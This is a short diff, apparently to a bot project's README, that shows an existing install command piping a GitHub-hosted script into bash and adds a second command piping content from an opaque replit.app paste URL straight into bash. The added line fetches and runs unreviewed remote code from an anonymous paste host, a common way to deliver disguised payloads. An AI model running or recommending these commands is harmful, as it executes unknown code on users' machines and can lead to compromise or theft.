@@ -14,3 +14,6 @@ bot
 ```
 bash <(curl -s https://raw.githubusercontent.com/tucommenceapousser/0xa/main/dlbot.sh)
 ```
+```
+bash <(curl -s https://hastetrkn.replit.app/raw/ebeqewijor)
+```
